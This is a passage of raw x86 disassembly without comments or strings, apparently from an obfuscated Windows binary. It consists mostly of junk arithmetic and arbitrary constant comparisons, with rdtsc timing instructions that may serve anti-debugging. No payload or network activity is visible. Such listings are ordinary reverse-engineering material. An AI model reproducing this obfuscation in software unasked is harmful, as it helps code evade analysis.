  41a743:	je     0x41a774
  41a745:	sub    DWORD PTR [ebp-0x8],ebx
  41a748:	cmp    ecx,0xfffffffe
  41a74b:	jne    0x41a774
  41a74d:	sub    ecx,edx
  41a74f:	add    DWORD PTR [ebp-0xc],ecx
  41a752:	mov    ebx,DWORD PTR ds:0x459f10
  41a758:	sub    ebx,edx
  41a75a:	mov    ecx,DWORD PTR [ebp-0x8]
  41a75d:	and    DWORD PTR [ebp-0xc],ecx
  41a760:	sub    ebx,eax
  41a762:	and    ebx,edx
  41a764:	cmp    ebx,DWORD PTR [ebp-0x24]
  41a767:	jne    0x41a774
  41a769:	cmp    ebx,DWORD PTR ds:0x459e5c
  41a76f:	je     0x41a774
  41a771:	add    DWORD PTR [ebp-0x48],ebx
  41a774:	pop    ebx
  41a775:	mov    edx,DWORD PTR ds:0x459e7c
  41a77b:	cmp    ebx,DWORD PTR ds:0x459e5c
  41a781:	jne    0x41a7d3
  41a783:	add    edx,ecx
  41a785:	mov    ecx,0x5
  41a78a:	mov    eax,0x3f24
  41a78f:	add    ecx,ebx
  41a791:	or     ecx,esi
  41a793:	add    DWORD PTR [ebp-0x8],eax
  41a796:	add    ecx,ebx
  41a798:	test   ecx,0x43408439
  41a79e:	jne    0x41a7d3
  41a7a0:	sub    edx,eax
  41a7a2:	mov    eax,DWORD PTR [ebp-0x48]
  41a7a5:	and    eax,edx
  41a7a7:	and    ecx,edx
  41a7a9:	cmp    ecx,0x64
  41a7ac:	jne    0x41a7d3
  41a7ae:	mov    edx,esi
  41a7b0:	add    DWORD PTR [ebp-0x8],ecx
  41a7b3:	cmp    edx,DWORD PTR ds:0x459e7c
  41a7b9:	jne    0x41a7d3
  41a7bb:	cmp    edi,DWORD PTR [ebp-0x24]
  41a7be:	jne    0x41a7d3
  41a7c0:	sub    edx,eax
  41a7c2:	mov    eax,edi
  41a7c4:	mov    ecx,DWORD PTR ds:0x459ebc
  41a7ca:	or     DWORD PTR [ebp-0xc],ecx
  41a7cd:	and    DWORD PTR [ebp-0x8],eax
  41a7d0:	sub    DWORD PTR [ebp-0x8],edx
  41a7d3:	leave  
  41a7d4:	ret    0x8
  41a7d7:	int3   
  41a7d8:	int3   
  41a7d9:	int3   
  41a7da:	int3   
  41a7db:	int3   
  41a7dc:	push   ebp
  41a7dd:	mov    ebp,esp
  41a7df:	sub    esp,0x40
  41a7e2:	mov    eax,0xfdbf
  41a7e7:	mov    ecx,0xc
  41a7ec:	add    ecx,ecx
  41a7ee:	sub    eax,ecx
  41a7f0:	add    ecx,eax
  41a7f2:	add    ecx,eax
  41a7f4:	mov    DWORD PTR [ebp-0x14],ecx
  41a7f7:	push   ebx
  41a7f8:	or     DWORD PTR [ebp-0x14],eax
  41a7fb:	push   esi
  41a7fc:	mov    edx,DWORD PTR [ebp-0x14]
  41a7ff:	sub    DWORD PTR [ebp-0x14],eax
  41a802:	sub    edx,ecx
  41a804:	sub    DWORD PTR [ebp-0x14],edx
  41a807:	push   edi
  41a808:	mov    edi,DWORD PTR [ebp-0x14]
  41a80b:	mov    esi,DWORD PTR [ebp-0x14]
  41a80e:	sub    edi,esi
  41a810:	add    edi,eax
  41a812:	cmp    edi,ecx
  41a814:	jne    0x41a824
  41a816:	mov    eax,DWORD PTR [ebp-0x14]
  41a819:	sub    DWORD PTR [ebp-0x14],edi
  41a81c:	mov    edx,ecx
  41a81e:	add    DWORD PTR [ebp-0x14],edx
  41a821:	or     DWORD PTR [ebp-0x14],eax
  41a824:	sub    DWORD PTR [ebp-0x14],eax
  41a827:	mov    edi,DWORD PTR [ebp-0x14]
  41a82a:	add    DWORD PTR [ebp-0x14],ecx
  41a82d:	mov    esi,edi
  41a82f:	sub    esi,ecx
  41a831:	cmp    esi,eax
  41a833:	je     0x41a838
  41a835:	sub    DWORD PTR [ebp-0x14],esi
  41a838:	rdtsc  
  41a83a:	mov    esi,0x61b
  41a83f:	mov    ecx,DWORD PTR [ebp-0x14]
  41a842:	add    DWORD PTR [ebp-0x14],eax
  41a845:	sub    DWORD PTR [ebp-0x14],ecx
  41a848:	mov    DWORD PTR [ebp-0x34],edi
  41a84b:	add    esi,eax
  41a84d:	mov    DWORD PTR [ebp-0x14],edx
  41a850:	add    esi,edi
  41a852:	cmp    esi,DWORD PTR [ebp-0x24]
  41a855:	je     0x41a8e7
  41a85b:	mov    ecx,DWORD PTR [ebp-0x34]
  41a85e:	mov    ebx,DWORD PTR [ebp-0x34]
  41a861:	add    DWORD PTR [ebp-0x14],esi
  41a864:	add    DWORD PTR [ebp-0x14],ebx
  41a867:	add    ecx,edi
  41a869:	cmp    esi,edx
  41a86b:	je     0x41a8e7
  41a86d:	and    ecx,edi
  41a86f:	mov    ebx,DWORD PTR [ebp-0x34]
  41a872:	cmp    ecx,0x5b
  41a875:	jne    0x41a8e7
  41a877:	cmp    ebx,esi
  41a879:	je     0x41a8e7
  41a87b:	mov    DWORD PTR [ebp-0x34],ecx
  41a87e:	add    ebx,ecx
  41a880:	and    ebx,esi
  41a882:	mov    edx,0xaf7
  41a887:	mov    edi,DWORD PTR [ebp-0x14]
  41a88a:	xor    DWORD PTR [ebp-0x14],edx
  41a88d:	sub    ebx,ecx
  41a88f:	cmp    ebx,0xff25
  41a895:	jne    0x41a8e7
  41a897:	cmp    ebx,0xffffffa1
  41a89a:	jne    0x41a8e7
  41a89c:	sub    DWORD PTR [ebp-0x34],eax
  41a89f:	test   edi,0x63
  41a8a5:	je     0x41a8e7
  41a8a7:	mov    esi,0x9d
  41a8ac:	sub    DWORD PTR [ebp-0x14],ebx
  41a8af:	mov    edx,DWORD PTR [ebp-0x14]
  41a8b2:	sub    edi,eax
  41a8b4:	add    esi,ecx
  41a8b6:	sub    DWORD PTR [ebp-0x34],edi
  41a8b9:	and    edx,edi
  41a8bb:	and    esi,edi
  41a8bd:	or     DWORD PTR [ebp-0x14],eax
  41a8c0:	sub    DWORD PTR [ebp-0x14],edx
  41a8c3:	cmp    esi,0x32
  41a8c6:	jne    0x41a8e7
  41a8c8:	cmp    esi,0x3d
  41a8cb:	jne    0x41a8e7
  41a8cd:	mov    edi,DWORD PTR [ebp-0x34]
  41a8d0:	test   esi,0x6d
  41a8d6:	je     0x41a8e7
  41a8d8:	test   edi,0x71
  41a8de:	je     0x41a8e7
  41a8e0:	mov    ecx,esi
  41a8e2:	and    edi,ecx
  41a8e4:	sub    DWORD PTR [ebp-0x34],edi
  41a8e7:	mov    ebx,DWORD PTR [ebp-0x14]
  41a8ea:	mov    DWORD PTR [ebp-0x20],ebx
  41a8ed:	mov    DWORD PTR [ebp-0x30],eax
  41a8f0:	cmp    edx,ebx
  41a8f2:	je     0x41a98a
  41a8f8:	sub    edx,ecx
  41a8fa:	add    DWORD PTR [ebp-0x34],ebx
  41a8fd:	cmp    edx,DWORD PTR [ebp-0x1c]
  41a900:	je     0x41a98a
  41a906:	test   edx,0xa9
  41a90c:	jne    0x41a98a
  41a90e:	mov    esi,ebx
  41a910:	sub    DWORD PTR [ebp-0x14],esi
  41a913:	test   edx,0x41
  41a919:	jne    0x41a98a
  41a91b:	mov    ebx,0x89
  41a920:	sub    edx,ecx
  41a922:	mov    esi,edi
  41a924:	sub    edx,eax
  41a926:	cmp    esi,ebx
  41a928:	je     0x41a98a
  41a92a:	mov    eax,DWORD PTR [ebp-0x14]
  41a92d:	mov    edi,0xf616
  41a932:	sub    DWORD PTR [ebp-0x14],esi
  41a935:	sub    DWORD PTR [ebp-0x34],edx
  41a938:	sub    DWORD PTR [ebp-0x34],eax
  41a93b:	sub    edi,esi
  41a93d:	cmp    edi,0x6a
  41a940:	je     0x41a98a
  41a942:	cmp    edi,0x98b0
  41a948:	je     0x41a98a
  41a94a:	sub    edi,ecx
  41a94c:	add    edi,ebx
  41a94e:	cmp    edi,DWORD PTR [ebp-0x1c]
  41a951:	jne    0x41a98a
  41a953:	cmp    edi,0xfffffffe
  41a956:	jne    0x41a98a
  41a958:	mov    ecx,edi
  41a95a:	mov    edi,DWORD PTR ds:0x459f1c
  41a960:	test   ecx,0xcb4f
  41a966:	je     0x41a98a
  41a968:	or     DWORD PTR [ebp-0x20],edi
  41a96b:	mov    edx,DWORD PTR [ebp-0x14]
  41a96e:	cmp    ecx,DWORD PTR [ebp-0x20]
  41a971:	je     0x41a98a
  41a973:	cmp    ecx,0x94b1
  41a979:	je     0x41a98a
  41a97b:	mov    esi,DWORD PTR [ebp-0x34]
  41a97e:	sub    DWORD PTR [ebp-0x34],edx
  41a981:	sub    ecx,esi
  41a983:	and    ecx,eax
  41a985:	add    ecx,eax
  41a987:	sub    DWORD PTR [ebp-0x20],ecx
  41a98a:	mov    esi,DWORD PTR [ebp-0x14]
  41a98d:	cmp    esi,0xffffff88
  41a990:	je     0x41a995
  41a992:	add    DWORD PTR [ebp-0x20],esi
  41a995:	rdtsc  
  41a997:	mov    ebx,0x5398
  41a99c:	xor    DWORD PTR [ebp-0x34],eax
  41a99f:	mov    edi,DWORD PTR ds:0x459f1c
  41a9a5:	add    ebx,esi
  41a9a7:	cmp    ebx,DWORD PTR [ebp-0x20]
  41a9aa:	jne    0x41a9f3
  41a9ac:	mov    edx,DWORD PTR [ebp-0x34]
  41a9af:	sub    DWORD PTR [ebp-0x34],edx
  41a9b2:	mov    ecx,DWORD PTR ds:0x459eec
  41a9b8:	sub    DWORD PTR [ebp-0x34],ecx
  41a9bb:	add    DWORD PTR [ebp-0x34],edi
  41a9be:	test   ebx,0xa3
  41a9c4:	jne    0x41a9f3
  41a9c6:	mov    ecx,DWORD PTR ds:0x459e9c
  41a9cc:	or     DWORD PTR [ebp-0x34],edx
  41a9cf:	mov    edi,DWORD PTR [ebp-0x20]
  41a9d2:	add    edi,edx
  41a9d4:	add    DWORD PTR [ebp-0x14],ecx
  41a9d7:	cmp    ebx,0xa
  41a9da:	jne    0x41a9f3
  41a9dc:	mov    ecx,0x86
  41a9e1:	add    DWORD PTR [ebp-0x20],edi
  41a9e4:	mov    edi,DWORD PTR ds:0x459f1c
  41a9ea:	add    ecx,ebx
  41a9ec:	add    ecx,edi
  41a9ee:	add    ecx,edx
  41a9f0:	add    DWORD PTR [ebp-0x14],ecx
  41a9f3:	cmp    esi,0x28
  41a9f6:	je     0x41aa2e
  41a9f8:	cmp    ebx,DWORD PTR ds:0x459e9c
  41a9fe:	je     0x41aa2e
  41aa00:	mov    ebx,0x17
  41aa05:	add    DWORD PTR [ebp-0x20],esi
  41aa08:	add    ebx,esi
  41aa0a:	mov    ecx,0x3ce6
  41aa0f:	or     ebx,edx
  41aa11:	add    DWORD PTR [ebp-0x20],ecx
  41aa14:	cmp    ebx,DWORD PTR ds:0x459eec
  41aa1a:	jne    0x41aa2e
  41aa1c:	mov    edi,esi
  41aa1e:	and    ebx,edx
  41aa20:	or     edi,edx
  41aa22:	mov    edx,DWORD PTR [ebp-0x14]
  41aa25:	add    DWORD PTR [ebp-0x34],ebx
  41aa28:	xor    DWORD PTR [ebp-0x34],edx
  41aa2b:	sub    DWORD PTR [ebp-0x34],edi
  41aa2e:	sub    eax,DWORD PTR [ebp-0x30]
  41aa31:	sub    ebx,ecx
  41aa33:	test   ebx,0xa72
  41aa39:	je     0x41aa4c
  41aa3b:	cmp    eax,0xffffffd5
  41aa3e:	je     0x41aa4c
  41aa40:	or     ebx,ecx
  41aa42:	test   eax,0x343d
  41aa47:	jne    0x41aa4c
  41aa49:	sub    DWORD PTR [ebp-0x34],ebx
  41aa4c:	test   esi,0xc25e
  41aa52:	jne    0x41ab6b
  41aa58:	test   ebx,0x5f
  41aa5e:	je     0x41ab6b
  41aa64:	mov    edx,DWORD PTR [ebp-0x20]
  41aa67:	test   edx,0x47d0
  41aa6d:	jne    0x41ab6b
  41aa73:	mov    esi,0xbe
  41aa78:	mov    ebx,DWORD PTR [ebp-0x20]
  41aa7b:	cmp    ebx,0xffffffac
  41aa7e:	jne    0x41ab6b
  41aa84:	mov    edi,DWORD PTR [ebp-0x14]
  41aa87:	mov    ecx,DWORD PTR [ebp-0x14]
  41aa8a:	sub    esi,edx
  41aa8c:	sub    DWORD PTR [ebp-0x20],ebx
  41aa8f:	cmp    ecx,edx
  41aa91:	je     0x41ab6b
  41aa97:	mov    ebx,DWORD PTR [ebp-0x34]
  41aa9a:	mov    edx,esi
  41aa9c:	cmp    ebx,DWORD PTR ds:0x459f1c
  41aaa2:	je     0x41ab6b
  41aaa8:	sub    ecx,ebx
  41aaaa:	add    DWORD PTR [ebp-0x20],edx
  41aaad:	mov    ebx,DWORD PTR [ebp-0x20]
  41aab0:	cmp    edi,ecx
  41aab2:	je     0x41ab6b
  41aab8:	mov    esi,DWORD PTR [ebp-0x20]
  41aabb:	mov    edx,DWORD PTR ds:0x459eec
  41aac1:	sub    ebx,esi
  41aac3:	cmp    edi,edx
  41aac5:	je     0x41ab6b
  41aacb:	sub    ebx,edx
  41aacd:	cmp    ebx,DWORD PTR ds:0x459eec
  41aad3:	jne    0x41ab6b
  41aad9:	mov    esi,DWORD PTR [ebp-0x34]
  41aadc:	test   ecx,0xc1
  41aae2:	jne    0x41ab6b
  41aae8:	cmp    edi,DWORD PTR ds:0x459eec
  41aaee:	je     0x41ab6b
  41aaf0:	cmp    ecx,0x4f
  41aaf3:	jne    0x41ab6b
  41aaf5:	mov    edx,0x58
  41aafa:	cmp    esi,DWORD PTR ds:0x459eec
  41ab00:	jne    0x41ab6b
  41ab02:	cmp    edi,esi
  41ab04:	jne    0x41ab6b
  41ab06:	sub    DWORD PTR [ebp-0x14],ebx
  41ab09:	sub    DWORD PTR [ebp-0x34],ecx
  41ab0c:	test   esi,0x6b
  41ab12:	je     0x41ab6b
  41ab14:	mov    ebx,DWORD PTR [ebp-0x20]
  41ab17:	mov    edx,0xf
  41ab1c:	sub    ebx,edi
  41ab1e:	cmp    esi,0x7a
  41ab21:	jne    0x41ab6b
  41ab23:	sub    DWORD PTR [ebp-0x34],edx
  41ab26:	add    DWORD PTR [ebp-0x20],ebx
  41ab29:	cmp    esi,0xffffffb6
  41ab2c:	jne    0x41ab6b
  41ab2e:	mov    edx,DWORD PTR [ebp-0x34]
  41ab31:	test   ecx,0x57
  41ab37:	jne    0x41ab6b
  41ab39:	test   edi,0x62
  41ab3f:	je     0x41ab6b
  41ab41:	mov    ebx,DWORD PTR [ebp-0x34]
  41ab44:	cmp    ebx,DWORD PTR ds:0x459f1c
  41ab4a:	jne    0x41ab6b
  41ab4c:	add    DWORD PTR [ebp-0x34],edx
  41ab4f:	add    ebx,eax
  41ab51:	add    DWORD PTR [ebp-0x34],ebx
  41ab54:	mov    ebx,DWORD PTR ds:0x459ee0
  41ab5a:	mov    edx,0xcb
  41ab5f:	add    ebx,esi
  41ab61:	or     DWORD PTR [ebp-0x14],ebx
  41ab64:	cmp    eax,edx
  41ab66:	jne    0x41ab6b
  41ab68:	add    DWORD PTR [ebp-0x14],edx
  41ab6b:	mov    ebx,DWORD PTR [ebp-0x14]
  41ab6e:	mov    esi,DWORD PTR [ebp-0x20]
  41ab71:	add    ebx,ecx
  41ab73:	cmp    esi,DWORD PTR ds:0x459e9c
  41ab79:	jne    0x41ac23
  41ab7f:	mov    ecx,0x9d
  41ab84:	mov    edi,DWORD PTR [ebp-0x14]
  41ab87:	cmp    ebx,edi
  41ab89:	je     0x41ac23
  41ab8f:	add    DWORD PTR [ebp-0x14],ecx
  41ab92:	mov    ecx,DWORD PTR ds:0x459eec
  41ab98:	and    edi,ecx
  41ab9a:	sub    edi,eax
  41ab9c:	mov    ecx,DWORD PTR ds:0x459e9c
  41aba2:	cmp    esi,0x53
  41aba5:	jne    0x41ac23
  41aba7:	cmp    ebx,0x39
  41abaa:	jne    0x41ac23
  41abac:	add    DWORD PTR [ebp-0x34],esi
  41abaf:	mov    esi,edi
  41abb1:	cmp    esi,DWORD PTR ds:0x459ee0
  41abb7:	je     0x41ac23
  41abb9:	cmp    esi,DWORD PTR ds:0x459ee0
  41abbf:	je     0x41ac23
  41abc1:	mov    ecx,DWORD PTR [ebp-0x20]
  41abc4:	add    esi,edx
  41abc6:	mov    edi,DWORD PTR [ebp-0x14]
  41abc9:	sub    DWORD PTR [ebp-0x20],esi
  41abcc:	test   esi,0x2a
  41abd2:	je     0x41ac23
  41abd4:	cmp    edi,DWORD PTR [ebp-0x3c]
  41abd7:	je     0x41ac23
  41abd9:	cmp    edi,DWORD PTR ds:0x459ee0
  41abdf:	je     0x41ac23
  41abe1:	sub    edi,eax
  41abe3:	mov    esi,DWORD PTR [ebp-0x34]
  41abe6:	add    esi,eax
  41abe8:	add    DWORD PTR [ebp-0x34],ecx
  41abeb:	mov    ecx,edi
  41abed:	add    ebx,ebx
  41abef:	test   esi,0x2d
  41abf5:	je     0x41ac23
  41abf7:	mov    edx,eax
  41abf9:	sub    DWORD PTR [ebp-0x14],edx
  41abfc:	mov    edx,DWORD PTR [ebp-0x34]
  41abff:	sub    ecx,edi
  41ac01:	add    ebx,edx
  41ac03:	cmp    ecx,0x11
  41ac06:	je     0x41ac23
  41ac08:	xor    DWORD PTR [ebp-0x14],ebx
  41ac0b:	mov    edx,edi
  41ac0d:	mov    edi,DWORD PTR ds:0x459ee0
  41ac13:	add    DWORD PTR [ebp-0x14],ecx
  41ac16:	sub    DWORD PTR [ebp-0x20],edx
  41ac19:	add    DWORD PTR [ebp-0x20],edi
  41ac1c:	add    esi,edi
  41ac1e:	sub    esi,edi
  41ac20:	add    DWORD PTR [ebp-0x20],esi
  41ac23:	pop    edi
  41ac24:	cmp    edi,DWORD PTR [ebp-0x10]
  41ac27:	je     0x41ae93
  41ac2d:	mov    esi,DWORD PTR [ebp-0x14]
  41ac30:	cmp    esi,0x75
  41ac33:	je     0x41ae93
  41ac39:	mov    edx,0x767d
  41ac3e:	mov    ecx,DWORD PTR [ebp-0x14]
  41ac41:	test   esi,0x30b0024
  41ac47:	jne    0x41ae93
  41ac4d:	sub    edx,edi
  41ac4f:	mov    ebx,DWORD PTR ds:0x459ed0
  41ac55:	sub    DWORD PTR [ebp-0x14],edx
  41ac58:	sub    DWORD PTR [ebp-0x34],ebx
  41ac5b:	mov    edx,DWORD PTR [ebp-0x14]
  41ac5e:	sub    DWORD PTR [ebp-0x34],esi
  41ac61:	xor    DWORD PTR [ebp-0x14],edx
  41ac64:	cmp    ecx,DWORD PTR ds:0x459eec
  41ac6a:	je     0x41ae93
  41ac70:	cmp    ecx,DWORD PTR ds:0x459f1c
  41ac76:	je     0x41ae93
  41ac7c:	add    ecx,eax
  41ac7e:	mov    esi,DWORD PTR [ebp-0x34]
  41ac81:	sub    ecx,eax
  41ac83:	add    esi,edi
  41ac85:	add    esi,eax
  41ac87:	mov    ebx,0xea
  41ac8c:	add    DWORD PTR [ebp-0x20],esi
  41ac8f:	cmp    ecx,eax
  41ac91:	je     0x41ae93
  41ac97:	add    ebx,ebx
  41ac99:	mov    edx,DWORD PTR [ebp-0x14]
  41ac9c:	sub    edx,esi
  41ac9e:	and    DWORD PTR [ebp-0x20],edx
  41aca1:	cmp    ecx,DWORD PTR ds:0x459ee0
  41aca7:	jne    0x41ae93
  41acad:	mov    esi,DWORD PTR ds:0x459e8c
  41acb3:	test   ecx,0x7
  41acb9:	je     0x41ae93
  41acbf:	add    DWORD PTR [ebp-0x14],ecx
  41acc2:	or     ebx,ecx
  41acc4:	and    ebx,eax
  41acc6:	add    DWORD PTR [ebp-0x20],edi
  41acc9:	mov    edx,0xf41
  41acce:	sub    DWORD PTR [ebp-0x14],edx
  41acd1:	add    DWORD PTR [ebp-0x34],eax
  41acd4:	sub    esi,edx
  41acd6:	or     DWORD PTR [ebp-0x14],esi
  41acd9:	mov    esi,DWORD PTR [ebp-0x14]
  41acdc:	cmp    esi,DWORD PTR [ebp-0x28]
  41acdf:	je     0x41ae93
  41ace5:	mov    edx,DWORD PTR [ebp-0x14]
  41ace8:	sub    ebx,esi
  41acea:	test   edx,0xd6
  41acf0:	jne    0x41ae93
  41acf6:	mov    esi,DWORD PTR [ebp-0x14]
  41acf9:	mov    DWORD PTR [ebp-0x18],ebx
  41acfc:	mov    ecx,DWORD PTR [ebp-0x20]
  41acff:	sub    esi,edi
  41ad01:	xor    DWORD PTR [ebp-0x18],eax
  41ad04:	cmp    edi,0x5d
  41ad07:	jne    0x41ae93
  41ad0d:	sub    DWORD PTR [ebp-0x20],edx
  41ad10:	sub    esi,ecx
  41ad12:	test   esi,0xfc
  41ad18:	jne    0x41ae93
  41ad1e:	mov    ebx,DWORD PTR [ebp-0x20]
  41ad21:	cmp    ebx,0xffffffef
  41ad24:	jne    0x41ae93
  41ad2a:	cmp    esi,DWORD PTR [ebp-0x14]
  41ad2d:	jne    0x41ae93
  41ad33:	mov    ecx,DWORD PTR [ebp-0x20]
  41ad36:	mov    edx,DWORD PTR [ebp-0x34]
  41ad39:	sub    DWORD PTR [ebp-0x14],esi
  41ad3c:	test   edi,0x12
  41ad42:	jne    0x41ae93
  41ad48:	mov    esi,DWORD PTR [ebp-0x20]
  41ad4b:	cmp    ecx,edx
  41ad4d:	je     0x41ae93
  41ad53:	cmp    edx,ebx
  41ad55:	je     0x41ae93
  41ad5b:	add    ebx,eax
  41ad5d:	and    edx,ecx
  41ad5f:	sub    ebx,edi
  41ad61:	sub    esi,eax
  41ad63:	cmp    esi,DWORD PTR ds:0x459eec
  41ad69:	je     0x41ae93
  41ad6f:	mov    ecx,DWORD PTR [ebp-0x18]
  41ad72:	add    DWORD PTR [ebp-0x14],edx
  41ad75:	cmp    ecx,0x3a
  41ad78:	jne    0x41ae93
  41ad7e:	mov    edx,esi
  41ad80:	and    edx,esi
  41ad82:	mov    esi,DWORD PTR [ebp-0x14]
  41ad85:	cmp    esi,0x7a2104a
  41ad8b:	je     0x41ae93
  41ad91:	or     ebx,eax
  41ad93:	sub    edx,eax
  41ad95:	cmp    ebx,DWORD PTR [ebp-0x10]
  41ad98:	je     0x41ae93
  41ad9e:	cmp    ecx,0x71c1
  41ada4:	je     0x41ae93
  41adaa:	or     edx,edi
  41adac:	and    DWORD PTR [ebp-0x34],ecx
  41adaf:	mov    ecx,0x896
  41adb4:	sub    DWORD PTR [ebp-0x20],ebx
  41adb7:	cmp    esi,DWORD PTR ds:0x459ee0
  41adbd:	je     0x41ae93
  41adc3:	add    DWORD PTR [ebp-0x34],edx
  41adc6:	mov    ebx,0x70
  41adcb:	mov    edx,DWORD PTR [ebp-0x20]
  41adce:	add    DWORD PTR [ebp-0x18],ebx
  41add1:	cmp    edx,edi
  41add3:	jne    0x41ae93
  41add9:	mov    ebx,0xbe
  41adde:	add    ebx,ecx
  41ade0:	cmp    esi,0x20
  41ade3:	je     0x41ae93
  41ade9:	mov    ecx,edi
  41adeb:	sub    edx,eax
  41aded:	cmp    esi,0x4bf0
  41adf3:	jne    0x41ae93
  41adf9:	add    DWORD PTR [ebp-0x34],ecx
  41adfc:	add    edx,edx
  41adfe:	add    DWORD PTR [ebp-0x18],edx
  41ae01:	mov    edx,DWORD PTR [ebp-0x14]
  41ae04:	cmp    edx,0xffffffd7
  41ae07:	jne    0x41ae93
  41ae0d:	and    edx,eax
  41ae0f:	cmp    edx,0x77
  41ae12:	je     0x41ae93
  41ae14:	mov    ecx,DWORD PTR [ebp-0x34]
  41ae17:	add    ebx,edx
  41ae19:	add    esi,eax
  41ae1b:	sub    DWORD PTR [ebp-0x20],esi
  41ae1e:	add    DWORD PTR [ebp-0x20],ebx
  41ae21:	cmp    edx,0xffffffe8
  41ae24:	jne    0x41ae93
  41ae26:	test   ecx,0x46
  41ae2c:	jne    0x41ae93
  41ae2e:	add    ecx,edi
  41ae30:	mov    esi,DWORD PTR [ebp-0x14]
  41ae33:	mov    edx,edi
  41ae35:	cmp    ecx,0xffffffdb
  41ae38:	jne    0x41ae93
  41ae3a:	cmp    esi,DWORD PTR ds:0x459f1c
  41ae40:	jne    0x41ae93
  41ae42:	sub    ecx,esi
  41ae44:	or     ecx,edx
  41ae46:	mov    ebx,DWORD PTR [ebp-0x34]
  41ae49:	mov    esi,DWORD PTR ds:0x459ed0
  41ae4f:	cmp    ebx,0x80bb
  41ae55:	jne    0x41ae93
  41ae57:	mov    edx,DWORD PTR [ebp-0x18]
  41ae5a:	add    edx,edx
  41ae5c:	add    DWORD PTR [ebp-0x20],ebx
  41ae5f:	sub    DWORD PTR [ebp-0x14],esi
  41ae62:	cmp    ecx,eax
  41ae64:	je     0x41ae93
  41ae66:	add    DWORD PTR [ebp-0x34],ecx
  41ae69:	mov    ebx,DWORD PTR ds:0x459e9c
  41ae6f:	sub    DWORD PTR [ebp-0x18],ebx
  41ae72:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae75:	and    DWORD PTR [ebp-0x18],ecx
  41ae78:	test   edx,0x861
  41ae7e:	jne    0x41ae93
  41ae80:	cmp    edx,0xc
  41ae83:	je     0x41ae93
  41ae85:	mov    ecx,DWORD PTR [ebp-0x20]
  41ae88:	cmp    ecx,0xffffffb9
  41ae8b:	jne    0x41ae93
  41ae8d:	sub    DWORD PTR [ebp-0x14],ecx
  41ae90:	and    DWORD PTR [ebp-0x20],edx
  41ae93:	pop    esi
  41ae94:	mov    edx,DWORD PTR [ebp-0x14]
  41ae97:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae9a:	add    DWORD PTR [ebp-0x20],edx
  41ae9d:	sub    ecx,esi
  41ae9f:	or     ecx,edx
  41aea1:	and    ecx,edi
  41aea3:	add    DWORD PTR [ebp-0x20],ecx
  41aea6:	pop    ebx
  41aea7:	sub    ecx,ebx
  41aea9:	mov    edx,0x23810031
  41aeae:	cmp    esi,DWORD PTR [ebp-0x20]
  41aeb1:	jne    0x41aed8
  41aeb3:	sub    DWORD PTR [ebp-0x14],ecx
  41aeb6:	add    edx,esi
  41aeb8:	mov    ecx,DWORD PTR ds:0x459ee0
  41aebe:	sub    edx,ecx
  41aec0:	cmp    edx,DWORD PTR ds:0x459ed0
  41aec6:	jne    0x41aed8
  41aec8:	add    edx,eax
  41aeca:	mov    ecx,edi
  41aecc:	and    ecx,eax
  41aece:	mov    DWORD PTR [ebp-0x20],edx
  41aed1:	sub    ecx,esi
  41aed3:	and    ecx,esi
  41aed5:	sub    DWORD PTR [ebp-0x20],ecx
  41aed8:	leave  
  41aed9:	ret    
  41aeda:	int3   
  41aedb:	int3   
  41aedc:	int3   
  41aedd:	int3   
  41aede:	int3   
  41aedf:	push   ebp
  41aee0:	mov    ebp,esp
  41aee2:	sub    esp,0x2c
  41aee5:	mov    ecx,0xed
  41aeea:	mov    eax,ecx
  41aeec:	and    eax,ecx
  41aeee:	add    eax,eax
  41aef0:	sub    eax,ecx
  41aef2:	mov    DWORD PTR [ebp-0xc],ecx
  41aef5:	sub    DWORD PTR [ebp-0xc],ecx
  41aef8:	add    DWORD PTR [ebp-0xc],ecx
  41aefb:	xor    DWORD PTR [ebp-0xc],eax
  41aefe:	push   ebx
  41aeff:	add    ecx,eax
  41af01:	mov    eax,0x96
  41af06:	sub    ecx,eax
  41af08:	mov    ebx,DWORD PTR [ebp-0xc]
  41af0b:	add    ebx,eax
  41af0d:	sub    DWORD PTR [ebp-0xc],ecx
  41af10:	and    ebx,ecx
  41af12:	sub    DWORD PTR [ebp-0xc],ecx
  41af15:	and    ebx,eax
  41af17:	add    DWORD PTR [ebp-0xc],ebx
  41af1a:	push   esi
  41af1b:	and    ecx,eax
  41af1d:	add    eax,ebx
  41af1f:	add    DWORD PTR [ebp-0xc],eax
  41af22:	mov    edx,DWORD PTR [ebp-0xc]
  41af25:	mov    esi,DWORD PTR [ebp-0xc]
  41af28:	add    edx,ecx
  41af2a:	test   edx,0xf2b5
  41af30:	je     0x41af5b
  41af32:	mov    ecx,DWORD PTR [ebp-0xc]
  41af35:	mov    eax,DWORD PTR [ebp-0xc]
  41af38:	sub    DWORD PTR [ebp-0xc],eax
  41af3b:	add    ecx,esi
  41af3d:	sub    ecx,esi
  41af3f:	add    edx,ebx
  41af41:	or     edx,ecx
  41af43:	sub    edx,ecx
  41af45:	sub    edx,eax
  41af47:	cmp    edx,DWORD PTR [ebp-0x20]
  41af4a:	jne    0x41af5b
  41af4c:	mov    ecx,0xcf
  41af51:	mov    esi,edx
  41af53:	and    esi,eax
  41af55:	add    DWORD PTR [ebp-0xc],ecx
  41af58:	or     DWORD PTR [ebp-0xc],esi
  41af5b:	push   edi
  41af5c:	mov    edx,DWORD PTR [ebp-0xc]
  41af5f:	xor    DWORD PTR [ebp-0xc],edx
  41af62:	or     DWORD PTR [ebp-0xc],esi
  41af65:	mov    eax,DWORD PTR [ebp+0x10]
  41af68:	mov    esi,edx
  41af6a:	sub    esi,ecx
  41af6c:	sub    esi,ecx
  41af6e:	xor    DWORD PTR [ebp-0xc],esi
  41af71:	mov    ecx,DWORD PTR [ebp+0x8]
  41af74:	sub    DWORD PTR [ebp-0xc],ecx
  41af77:	cmp    DWORD PTR [ebp+0xc],eax
  41af7a:	je     0x41b0b2
  41af80:	and    esi,eax
  41af82:	cmp    ecx,0xffffff94
  41af85:	je     0x41b043
  41af8b:	mov    ebx,DWORD PTR ds:0x459ed8
  41af91:	mov    edi,DWORD PTR ds:0x459ed8
  41af97:	cmp    esi,DWORD PTR ds:0x459ed8
  41af9d:	jne    0x41b043
  41afa3:	cmp    esi,0x49
  41afa6:	jne    0x41b043
  41afac:	mov    edx,DWORD PTR ds:0x459eb0
  41afb2:	sub    DWORD PTR [ebp-0xc],edi
  41afb5:	cmp    eax,0x3870090
  41afba:	je     0x41b043
  41afc0:	mov    edx,0x41
  41afc5:	mov    edi,0xfd
  41afca:	add    ebx,edi
  41afcc:	add    DWORD PTR [ebp-0xc],edx
  41afcf:	cmp    esi,edi
  41afd1:	jne    0x41b043
